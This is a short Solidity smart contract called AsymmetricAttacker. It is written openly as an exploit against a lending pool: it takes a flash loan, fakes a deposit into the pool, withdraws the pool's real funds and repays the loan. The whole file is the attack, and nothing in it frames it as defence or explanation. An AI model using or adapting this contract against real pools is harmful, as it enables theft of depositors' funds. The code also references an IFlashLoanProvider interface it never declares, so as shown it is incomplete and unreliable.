// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPool {
    function receiveLoan(uint256 amount) external;
    function withdraw() external;
}

contract AsymmetricAttacker {
    address public pool;
    address public loanProvider;

    constructor(address _pool, address _loanProvider) {
        pool = _pool;
        loanProvider = _loanProvider;
    }

    function executeAttack(uint256 amount) public {
        IFlashLoanProvider(loanProvider).flashLoan(amount); // Starts flash loan
    }

    // Callback from loan provider
    function onFlashLoan(uint256 amount) external {
        IPool(pool).receiveLoan(amount); // Fakes deposit
        IPool(pool).withdraw();          // Withdraws real funds

        payable(loanProvider).transfer(amount); // Repays loan
    }

    receive() external payable {}
}
